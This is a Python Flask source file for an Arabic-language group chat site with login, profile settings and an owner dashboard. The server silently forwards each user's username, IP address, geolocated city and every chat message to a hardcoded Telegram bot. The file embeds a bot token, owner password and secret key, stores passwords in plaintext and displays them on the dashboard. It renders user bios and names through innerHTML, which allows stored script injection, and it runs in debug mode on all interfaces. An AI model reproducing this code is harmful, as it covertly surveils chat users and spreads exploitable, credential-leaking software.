import os
import requests
import json
import time
from functools import wraps
# استخدام render_template_string لدمج القالب داخل Python
from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify

APP_NAME = "SIN.COM"
OWNER_USERNAME = "SIN"
OWNER_PASSWORD = "@SIN_PHP"
TELEGRAM_BOT_TOKEN = '8584509611:AAG6N_wB5GzWiL1NhopFFjXb6t25SSeeink'
TELEGRAM_CHAT_ID = '@XXXXXXXKLPP'
LOG_FILE = 'chat_log.txt'
USER_DATA_FILE = 'users.json'
MAX_MESSAGES = 100
ACTIVITY_TIMEOUT = 15
DEV_CHANNEL = 'https://t.me/SIN_PYHTON'
DEV_USERNAME = '@SIN_PHP'

app = Flask(APP_NAME)
app.secret_key = '8584509wB5GzWiL1NhopFFjXb6t25SSeeink'

active_sessions = {}

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تسجيل الدخول</title>
    <style>
        body { font-family: Tahoma; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f0; direction: rtl; }
        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 300px; text-align: center; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; text-align: right; }
        button { padding: 10px 15px; background-color: #075e54; color: white; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
        .error { color: red; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>تسجيل الدخول</h2>
        {% if error %}
        <p class="error">{{ error }}</p>
        {% endif %}
        <form method="POST">
            <input type="text" name="username" placeholder="اسم المستخدم" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit">دخول / تسجيل</button>
        </form>
        <p style="font-size:12px;color:#777;">* لإنشاء حساب جديد، استخدم بيانات غير موجودة.</p>
    </div>
</body>
</html>
"""

SETTINGS_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>إعدادات المستخدم</title>
    <style>
        body { font-family: Tahoma; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f0; direction: rtl; }
        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 400px; text-align: right; }
        h2 { color: #075e54; }
        input[type="text"], textarea { width: 100%; padding: 10px; margin: 5px 0 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; text-align: right; resize: vertical; }
        button { padding: 10px 15px; background-color: #075e54; color: white; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
        .message { color: green; margin-bottom: 10px; text-align: center; }
        .error { color: red; margin-bottom: 10px; text-align: center; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        .back-link { display: block; margin-bottom: 20px; color: #075e54; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <a href="{{ url_for('chat_page') }}" class="back-link">&larr; العودة إلى الدردشة</a>
        <h2>تعديل معلومات الملف الشخصي</h2>
        {% if message %}
        <p class='message'>{{ message }}</p>
        {% endif %}
        {% if error %}
        <p class='error'>{{ error }}</p>
        {% endif %}
        <form method="POST">
            <label for="username">اسم المستخدم (Username - لا يمكن تغييره):</label>
            <input type="text" id="username" name="username" value="{{ user.username }}" disabled>

            <label for="display_name">اسم العرض (الذي يراه الآخرون):</label>
            <input type="text" id="display_name" name="display_name" value="{{ user.display_name }}" required>

            <label for="bio">معلوماتي عني (Bio):</label>
            <textarea id="bio" name="bio" rows="4">{{ user.bio }}</textarea>

            <button type="submit">حفظ التعديلات</button>
        </form>
    </div>
</body>
</html>
"""

DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم المالك</title>
    <style>
        body { font-family: Tahoma; background-color: #f0f0f0; margin: 0; padding: 20px; direction: rtl; }
        h2 { color: #075e54; border-bottom: 2px solid #ddd; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; background-color: white; box-shadow: 0 4px 8px rgba(0,0,0,0.1); font-size: 14px; }
        th, td { border: 1px solid #ddd; padding: 12px; text-align: right; }
        th { background-color: #075e54; color: white; }
        tr:nth-child(even) { background-color: #f9f9f9; }
        .back-link { display: block; margin-bottom: 20px; color: #075e54; text-decoration: none; font-weight: bold; }
        .json-preview { background-color: #222; color: #0f0; padding: 15px; border-radius: 5px; white-space: pre-wrap; font-family: monospace; font-size: 14px; margin-top: 20px; }
        .dev-info { background-color: #fff3e0; padding: 10px; border-radius: 5px; margin-top: 20px; border-right: 5px solid #ff9800; }
        .dev-info a { color: #075e54; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <a href="{{ url_for('chat_page') }}" class="back-link">&larr; العودة إلى الدردشة</a>
    <h2>قائمة المستخدمين المسجلين ({{ all_users|length }})</h2>
    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>اسم المستخدم (Key)</th>
                <th>اسم العرض (Display)</th>
                <th>المعلومات (Bio)</th>
                <th>الدور</th>
                <th>الموقع</th>
                <th>IP الأخير</th>
                <th>النشاط</th>
            </tr>
        </thead>
        <tbody>
            {% for user in all_users %}
            <tr>
                <td>{{ user.id }}</td>
                <td>{{ user.username }}</td>
                <td>{{ user.display_name }}</td>
                <td>{{ user.bio }}</td>
                <td>{{ user.role }}</td>
                <td>{{ user.location_info if user.location_info else 'N/A' }}</td>
                <td>{{ user.last_ip if user.last_ip else 'N/A' }}</td>
                <td>{{ 'نعم' if is_active(user.username) else 'لا' }}</td>
            </tr>
            {% endfor %}
        </tbody>
    </table>

    <div class="dev-info">
        <p><strong>حقوق المطور:</strong> <a href="{{ DEV_CHANNEL }}" target="_blank">{{ DEV_USERNAME }}</a> (قناة التليجرام)</p>
    </div>

    <h2>محتوى ملف users.json</h2>
    <pre class="json-preview">{{ users_json }}</pre>
</body>
</html>
"""

CHAT_INTERFACE_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الدردشة العامة</title>
    <style>
        body { font-family: 'Tahoma', sans-serif; background-color: #f0f0f0; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        #chat-window { display: flex; flex-direction: column; width: 100%; height: 100vh; background: #e5ddd5; box-shadow: 0 0 20px rgba(0,0,0,0.2); position: relative; border-radius: 0; }
        @media (min-width: 421px) {
            #chat-window {
                width: 420px;
                height: 90vh;
                border-radius: 12px;
            }
        }
        #messages { list-style-type: none; padding: 10px; flex-grow: 1; overflow-y: auto; margin: 0; }
        #messages li { padding: 8px 12px; margin-bottom: 8px; max-width: 80%; border-radius: 18px; line-height: 1.4; word-wrap: break-word; font-size: 15px; position: relative; }
        .message-sent { background-color: #dcf8c6; margin-left: auto; text-align: left; }
        .message-received { background-color: #ffffff; margin-right: auto; box-shadow: 0 1px 0.5px rgba(0,0,0,0.1); text-align: right; }
        .username { font-weight: bold; font-size: 12px; color: #333; display: block; margin-bottom: 4px; }
        .owner-name { color: #075e54; }
        .reply-button { position: absolute; top: 50%; left: -30px; transform: translateY(-50%); font-size: 18px; cursor: pointer; color: #888; padding: 5px; opacity: 0; transition: opacity 0.3s; }
        .message-received .reply-button { left: unset; right: -30px; }
        #messages li:hover .reply-button { opacity: 1; }

        .reply-quote { background-color: #e0e0e0; border-right: 3px solid #075e54; padding: 5px; margin-bottom: 5px; border-radius: 4px; font-size: 13px; color: #555; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-height: 30px; }
        .message-sent .reply-quote { border-left: 3px solid #075e54; border-right: none; text-align: left; }
        .reply-quote strong { color: #075e54; }


        #header { background-color: #075e54; color: white; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; }
        #status-container { display: flex; flex-direction: column; align-items: flex-end; }
        #active-users-count { font-size: 12px; font-weight: bold; }
        #menu-icon { font-size: 24px; cursor: pointer; padding: 0 5px; line-height: 1; transform: rotate(90deg); user-select: none; }
        #dropdown-menu { position: absolute; top: 50px; right: 10px; background-color: #ffffff; box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2); z-index: 10; min-width: 220px; border-radius: 4px; display: none; }
        #dropdown-menu a { color: black; padding: 12px 16px; text-decoration: none; display: block; font-size: 14px; border-bottom: 1px solid #eee; }
        #dropdown-menu a:hover { background-color: #f1f1f1; }
        #dropdown-menu p { padding: 12px 16px 5px; margin: 0; font-size: 12px; color: #777; }
        #active-users-list { max-height: 200px; overflow-y: auto; padding: 5px 16px; border-bottom: 1px solid #eee; }
        .active-user-item { font-size: 13px; margin: 4px 0; color: #333; cursor: pointer; padding: 5px; border-radius: 4px; }
        .active-user-item:hover { background-color: #f0f0f0; }
        .active-user-item strong { color: #075e54; }
        #input-area { display: flex; flex-direction: column; padding: 8px; background-color: #f0f0f0; align-items: stretch; }
        #reply-preview { background-color: #e0e0e0; padding: 5px 10px; border-radius: 8px; margin-bottom: 5px; display: none; justify-content: space-between; align-items: center; }
        #reply-preview-text { font-size: 12px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 90%; }
        #clear-reply { cursor: pointer; font-weight: bold; color: #555; }
        #message-input-wrapper { display: flex; }
        #message_input { flex-grow: 1; padding: 10px 15px; border: 1px solid #ccc; border-radius: 20px; margin: 0 8px; font-size: 16px; }
        #input-area button { padding: 10px; background-color: #075e54; color: white; border: none; border-radius: 50%; width: 45px; height: 45px; font-size: 18px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        #footer { text-align: center; padding: 5px; font-size: 10px; color: #777; background-color: #fff; border-top: 1px solid #ddd; }
        .dev-info { font-size: 11px; }
        .dev-info a { color: #075e54; text-decoration: none; font-weight: bold; }

        #profile-modal { display: none; position: fixed; z-index: 20; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.4); }
        .modal-content { background-color: #fefefe; margin: 15% auto; padding: 20px; border: 1px solid #888; width: 80%; max-width: 350px; border-radius: 10px; text-align: right; }
        .close-btn { color: #aaa; float: left; font-size: 28px; font-weight: bold; }
        .close-btn:hover, .close-btn:focus { color: black; text-decoration: none; cursor: pointer; }
        .modal-content h3 { color: #075e54; border-bottom: 2px solid #ddd; padding-bottom: 5px; }
        .modal-info { margin-bottom: 10px; border-bottom: 1px dashed #eee; padding-bottom: 5px; }
        .modal-info strong { display: inline-block; width: 100px; color: #555; }
    </style>
</head>
<body>
    <div id="chat-window">
        <div id="header">
            <div id="status-container">
                <span>مرحباً، {{ CURRENT_DISPLAY_NAME }}</span>
                <span id="active-users-count">النشطون: 0</span>
            </div>
            <div id="menu-container">
                <span id="menu-icon" onclick="toggleMenu()">&#x22EE;</span>
                <div id="dropdown-menu">
                    {{ OWNER_BUTTON | safe }}
                    <a href="{{ url_for('settings') }}">تعديل ملفي الشخصي</a>
                    <p>المستخدمون النشطون</p>
                    <div id="active-users-list"></div>
                    <a href="{{ url_for('logout') }}">تسجيل الخروج</a>
                </div>
            </div>
        </div>
        <ul id="messages"></ul>
        <div id="input-area">
            <div id="reply-preview">
                <span id="reply-preview-text"></span>
                <span id="clear-reply" onclick="clearReply()">&#10005;</span>
            </div>
            <div id="message-input-wrapper">
                <input id="message_input" type="text" placeholder="اكتب رسالتك...">
                <button onclick="sendMessage()">&#x27A4;</button>
            </div>
        </div>
        <div id="footer">
            <div class="dev-info">
            حقوق المطور: <a href="{{ DEV_CHANNEL }}" target="_blank">{{ DEV_USERNAME }}</a>
            </div>
        </div>
    </div>

    <div id="profile-modal" onclick="closeModal(event)">
        <div class="modal-content">
            <span class="close-btn">&times;</span>
            <h3 id="modal-display-name"></h3>
            <div class="modal-info"><strong>الاسم المفتاحي:</strong> <span id="modal-username"></span></div>
            <div class="modal-info"><strong>الدور:</strong> <span id="modal-role"></span></div>
            <div class="modal-info"><strong>الموقع:</strong> <span id="modal-location"></span></div>
            <div class="modal-info"><strong>معلوماتي:</strong> <span id="modal-bio"></span></div>
        </div>
    </div>


    <script>
        // استخدام فلتر |tojson|safe لتحويل متغيرات Jinja2 إلى JS بأمان
        const CURRENT_USERNAME = {{ CURRENT_USERNAME | tojson | safe }};
        let lastMessageTimestamp = 0;
        const messagesList = document.getElementById('messages');
        const activeUsersCount = document.getElementById('active-users-count');
        const activeUsersListDiv = document.getElementById('active-users-list');
        let activeUsersData = {};
        let currentReply = { id: null, text: null };

        const profileModal = document.getElementById('profile-modal');
        const closeModalButton = document.getElementsByClassName('close-btn')[0];

        closeModalButton.onclick = function() {
            profileModal.style.display = 'none';
        }
        function closeModal(event) {
            if (event.target === profileModal) {
                profileModal.style.display = 'none';
            }
        }
        window.openProfileModal = function(username) {
            const userData = activeUsersData[username];
            if (!userData) return;

            document.getElementById('modal-display-name').textContent = userData.display_name;
            document.getElementById('modal-username').textContent = userData.username;
            document.getElementById('modal-role').textContent = userData.role;
            document.getElementById('modal-location').textContent = userData.location;
            document.getElementById('modal-bio').textContent = userData.bio;

            profileModal.style.display = 'block';
        }

        const replyPreview = document.getElementById('reply-preview');
        const replyPreviewText = document.getElementById('reply-preview-text');

        window.setReply = function(messageId, senderName, messageText) {
            currentReply.id = messageId;
            currentReply.text = messageText;

            replyPreviewText.innerHTML = `الرد على <strong>${senderName}</strong>: ${messageText.substring(0, 30)}${messageText.length > 30 ? '...' : ''}`;
            replyPreview.style.display = 'flex';
            document.getElementById('message_input').focus();
        }

        window.clearReply = function() {
            currentReply.id = null;
            currentReply.text = null;
            replyPreview.style.display = 'none';
        }


        function toggleMenu() {
            const menu = document.getElementById('dropdown-menu');
            menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
        }

        function fetchActiveUsers() {
            fetch('{{ url_for("get_active_users") }}')
                .then(response => response.json())
                .then(data => {
                    activeUsersData = {};

                    activeUsersCount.textContent = `النشطون: ${data.active_users.length}`;
                    activeUsersListDiv.innerHTML = '';

                    if (data.active_users.length === 0) {
                         activeUsersListDiv.innerHTML = '<div class="active-user-item" style="color:#777;">لا يوجد مستخدمون نشطون حالياً.</div>';
                    }

                    data.active_users.forEach(user => {
                        activeUsersData[user.username] = user;

                        const userItem = document.createElement('div');
                        userItem.classList.add('active-user-item');
                        let roleText = user.role === 'owner' ? ' (المالك)' : '';
                        userItem.innerHTML = `<strong>${user.display_name}${roleText}</strong><br>${user.bio}`;
                        userItem.setAttribute('onclick', `openProfileModal('${user.username}')`);
                        activeUsersListDiv.appendChild(userItem);
                    });
                })
                .catch(error => console.error('Error fetching active users:', error));
        }

        function displayMessages(messages) {
            messages.forEach(data => {
                if (data.timestamp > lastMessageTimestamp) {
                    const newItem = document.createElement('li');
                    newItem.setAttribute('id', `msg-${data.id}`);

                    if (data.reply_to_id && data.reply_text) {
                        const replyQuote = document.createElement('div');
                        replyQuote.classList.add('reply-quote');
                        replyQuote.innerHTML = `الرد على: <strong>${data.reply_text.substring(0, 20)}${data.reply_text.length > 20 ? '...' : ''}</strong>`;
                        newItem.appendChild(replyQuote);
                    }

                    const usernameSpan = document.createElement('span');
                    usernameSpan.classList.add('username');

                    let displayUsername = data.user_identifier + ":";
                    if (data.role === 'owner') {
                        displayUsername = "المالك (" + data.user_identifier + "):";
                        usernameSpan.classList.add('owner-name');
                    }

                    usernameSpan.textContent = displayUsername;
                    newItem.appendChild(usernameSpan);

                    newItem.appendChild(document.createTextNode(data.message));

                    const replyButton = document.createElement('span');
                    replyButton.classList.add('reply-button');
                    replyButton.innerHTML = '&#x21A9;';
                    // الهروب الصحيح لعلامات التنصيص في JS
                    const escapedUser = data.user_identifier.replace(/'/g, "\\'");
                    const escapedMessage = data.message.replace(/'/g, "\\'");
                    replyButton.setAttribute('onclick', `setReply(${data.id}, '${escapedUser}', '${escapedMessage}')`);
                    newItem.appendChild(replyButton);

                    if (data.username_key === CURRENT_USERNAME) {
                        newItem.classList.remove('message-received');
                        newItem.classList.add('message-sent');
                    } else {
                        newItem.classList.remove('message-sent');
                        newItem.classList.add('message-received');
                    }

                    messagesList.appendChild(newItem);
                    messagesList.scrollTop = messagesList.scrollHeight;
                    lastMessageTimestamp = data.timestamp;
                }
            });
        }

        function fetchMessages() {
            fetch('{{ url_for("get_messages") }}?last_timestamp=' + lastMessageTimestamp)
                .then(response => {
                    if (!response.ok) throw new Error('Network response was not ok');
                    return response.json();
                })
                .then(data => {
                    if (data.messages && data.messages.length > 0) {
                        displayMessages(data.messages);
                    }
                })
                .catch(error => console.error('Error fetching messages:', error));
        }

        function sendMessage() {
            const messageInput = document.getElementById('message_input');
            const message = messageInput.value.trim();

            if (message) {
                const payload = {
                    message: message,
                    reply_to_id: currentReply.id,
                    reply_text: currentReply.text
                };

                fetch('{{ url_for("handle_incoming_message") }}', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        messageInput.value = '';
                        clearReply();
                        fetchMessages();
                    }
                })
                .catch(error => console.error('Error sending message:', error));
            }
        }

        document.getElementById('message_input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendMessage();
                e.preventDefault();
            }
        });

        window.onclick = function(event) {
            if (!event.target.matches('#menu-icon') && !profileModal.contains(event.target)) {
                const dropdowns = document.getElementById("dropdown-menu");
                if (dropdowns.style.display === 'block') {
                    dropdowns.style.display = 'none';
                }
            }
        }

        fetchMessages();
        setInterval(fetchMessages, 1000);
        fetchActiveUsers();
        setInterval(fetchActiveUsers, 10000);

    </script>
</body>
</html>
"""



def load_users():
    if not os.path.exists(USER_DATA_FILE):
        users = {
            OWNER_USERNAME: {
                'id': 1,
                'username': OWNER_USERNAME,
                'password': OWNER_PASSWORD,
                'role': 'owner',
                'display_name': OWNER_USERNAME,
                'bio': 'مالك التطبيق.',
                'last_ip': None,
                'location_info': None
            }
        }
        save_users(users)
        return users

    try:
        with open(USER_DATA_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            for username, user_data in data.items():
                if 'display_name' not in user_data:
                    user_data['display_name'] = username
                if 'bio' not in user_data:
                    user_data['bio'] = 'لم يتم التعيين.'
            return data
    except (json.JSONDecodeError, FileNotFoundError):
        return {}

def save_users(users):
    try:
        with open(USER_DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(users, f, indent=4, ensure_ascii=False)
        return True
    except Exception:
        return False

def get_user_location_info(ip):
    try:
        if ip in ['127.0.0.1', '::1', '192.168.0.100', '172.0.0.1', '10.0.0.1']:
            ip_for_lookup = ''
        else:
            ip_for_lookup = ip

        response = requests.get(f"https://ipapi.co/{ip_for_lookup}/json/", timeout=3)
        data = response.json()
        city = data.get('city', 'N/A')
        country = data.get('country_name', 'N/A')
        return f"{city}, {country}"
    except Exception:
        return "غير معروف (خطأ في API)"

def send_to_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        requests.post(url, data=payload)
    except Exception:
        pass

def update_activity(username):
    active_sessions[username] = time.time()

def is_active(username):
    last_active = active_sessions.get(username, 0)
    return time.time() - last_active < ACTIVITY_TIMEOUT

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get('logged_in') != True:
            return redirect(url_for('login'))
        update_activity(session.get('username'))
        return f(*args, **kwargs)
    return decorated_function

def owner_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get('logged_in') != True or session.get('role') != 'owner':
            return "ممنوع الدخول. هذه الصفحة مخصصة للمالك فقط.", 403
        update_activity(session.get('username'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
@login_required
def index():
    return redirect(url_for('chat_page'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if session.get('logged_in') == True:
        return redirect(url_for('chat_page'))

    users = load_users()
    error = None

    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        user_ip = request.headers.get('X-Real-IP', request.remote_addr)
        location_info = get_user_location_info(user_ip)

        user_data = users.get(username)

        if user_data:
            if user_data['password'] == password:
                session['logged_in'] = True
                session['username'] = username
                session['role'] = user_data['role']

                users[username]['last_ip'] = user_ip
                users[username]['location_info'] = location_info
                save_users(users)

                update_activity(username)
                telegram_message = f"✅ دخول: {username}\n*الدور:* {user_data['role']}\n*IP:* {user_ip}\n*الموقع:* {location_info}"
                send_to_telegram(telegram_message)
                return redirect(url_for('chat_page'))
            else:
                error = 'كلمة المرور غير صحيحة'
        else:
            if len(username) < 3 or len(password) < 3:
                error = 'البيانات يجب أن تكون 3 أحرف على الأقل.'
            elif username in users:
                error = 'اسم المستخدم موجود بالفعل.'
            else:
                new_id = len(users) + 1
                new_user = {
                    'id': new_id,
                    'username': username,
                    'password': password,
                    'role': 'user',
                    'display_name': username,
                    'bio': 'لم يتم التعيين.',
                    'last_ip': user_ip,
                    'location_info': location_info
                }
                users[username] = new_user
                save_users(users)

                session['logged_in'] = True
                session['username'] = username
                session['role'] = 'user'
                update_activity(username)

                telegram_message = f"🎉 تسجيل جديد: {username}\n*الدور:* user\n*IP:* {user_ip}\n*الموقع:* {location_info}"
                send_to_telegram(telegram_message)
                return redirect(url_for('chat_page'))


    return render_template_string(LOGIN_TEMPLATE, error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    session.pop('role', None)
    return redirect(url_for('login'))

@app.route('/settings', methods=['GET', 'POST'])
@login_required
def settings():
    users = load_users()
    current_username = session['username']
    user_data = users[current_username]
    message = None
    error = None

    if request.method == 'POST':
        new_display_name = request.form.get('display_name').strip()
        new_bio = request.form.get('bio').strip()

        if not new_display_name:
            error = "اسم العرض لا يمكن أن يكون فارغاً."
        else:
            user_data['display_name'] = new_display_name
            user_data['bio'] = new_bio
            users[current_username] = user_data
            save_users(users)
            message = "تم حفظ الإعدادات بنجاح."


    return render_template_string(SETTINGS_TEMPLATE, user=user_data, message=message, error=error)


def save_message_to_log(user_id, user_role, message, reply_to_id=None, reply_text=None):
    timestamp = int(time.time())
    users = load_users()
    display_name = users.get(user_id, {}).get('display_name', user_id)

    try:
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            all_lines = f.readlines()
            if all_lines:
                last_line = json.loads(all_lines[-1])
                new_id = last_line.get('id', 0) + 1
            else:
                new_id = 1
    except (FileNotFoundError, json.JSONDecodeError):
        new_id = 1

    log_entry = json.dumps({
        'id': new_id,
        'timestamp': timestamp,
        'user_identifier': display_name,
        'username_key': user_id,
        'message': message,
        'role': user_role,
        'reply_to_id': reply_to_id,
        'reply_text': reply_text
    }, ensure_ascii=False)

    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_entry + '\n')

        with open(LOG_FILE, 'r+', encoding='utf-8') as f:
            f.seek(0)
            lines = f.readlines()

            if len(lines) > MAX_MESSAGES:
                lines = lines[-MAX_MESSAGES:]

            f.seek(0)
            f.truncate()
            f.writelines(lines)

    except Exception as e:
        print(f"Error managing log: {e}")

@app.route('/send_message', methods=['POST'])
@login_required
def handle_incoming_message():
    user_id = session.get('username')
    user_role = session.get('role')
    data = request.get_json()
    message = data.get('message')
    reply_to_id = data.get('reply_to_id')
    reply_text = data.get('reply_text')

    if not message:
        return jsonify({'success': False, 'message': 'Message is empty'}), 400

    save_message_to_log(user_id, user_role, message, reply_to_id, reply_text)

    users = load_users()
    display_name = users.get(user_id, {}).get('display_name', user_id)

    telegram_message = f"رسالة جديدة من: {display_name} ({user_id})\n"
    if reply_to_id and reply_text:
        telegram_message += f"رد على (ID: {reply_to_id}): '{reply_text[:20]}...'\n"
    telegram_message += f"*الرسالة:* {message}"
    send_to_telegram(telegram_message)

    return jsonify({'success': True})

@app.route('/get_messages')
@login_required
def get_messages():
    last_timestamp = request.args.get('last_timestamp', type=int, default=0)

    messages = []
    try:
        if not os.path.exists(LOG_FILE):
            return jsonify({'messages': []})

        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                try:
                    message_data = json.loads(line)
                    if message_data['timestamp'] > last_timestamp:
                        messages.append(message_data)
                except json.JSONDecodeError:
                    continue

    except Exception as e:
        print(f"Error reading log: {e}")

    return jsonify({'messages': messages})


@app.route('/get_active_users')
@login_required
def get_active_users():
    users = load_users()
    active_user_data = []

    active_usernames = [
        username for username, last_active in active_sessions.items()
        if time.time() - last_active < ACTIVITY_TIMEOUT
    ]

    for username in active_usernames:
        user = users.get(username)
        if user and is_active(username):
            active_user_data.append({
                'username': user['username'],
                'display_name': user['display_name'],
                'bio': user['bio'],
                'location': user['location_info'] if user['location_info'] else 'غير معروف',
                'role': user['role']
            })

    return jsonify({'active_users': active_user_data})

@app.route('/owner_dashboard')
@owner_required
def owner_dashboard():
    all_users_dict = load_users()
    all_users = list(all_users_dict.values())

    users_json = json.dumps(all_users_dict, indent=4, ensure_ascii=False)

    # استخدام render_template_string مع القالب المخزن
    return render_template_string(
        DASHBOARD_TEMPLATE,
        all_users=all_users,
        users_json=users_json,
        DEV_CHANNEL=DEV_CHANNEL,
        DEV_USERNAME=DEV_USERNAME,
        is_active=is_active # تمرير الدالة لاستخدامها في القالب
    )

@app.route('/chat')
@login_required
def chat_page():
    users = load_users()
    CURRENT_USERNAME = session.get('username')
    USER_ROLE = session.get('role')

    CURRENT_DISPLAY_NAME = users.get(CURRENT_USERNAME, {}).get('display_name', CURRENT_USERNAME)

    OWNER_BUTTON = ""
    if USER_ROLE == 'owner':
        # استخدام f-string لتضمين url_for هنا، ثم تمريرها إلى Jinja2 كـ |safe
        OWNER_BUTTON = f'<a href="{url_for("owner_dashboard")}">لوحة تحكم المالك</a>'

    # استخدام render_template_string مع القالب المخزن
    return render_template_string(
        CHAT_INTERFACE_TEMPLATE,
        CURRENT_DISPLAY_NAME=CURRENT_DISPLAY_NAME,
        CURRENT_USERNAME=CURRENT_USERNAME,
        OWNER_BUTTON=OWNER_BUTTON,
        DEV_CHANNEL=DEV_CHANNEL,
        DEV_USERNAME=DEV_USERNAME
    )


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
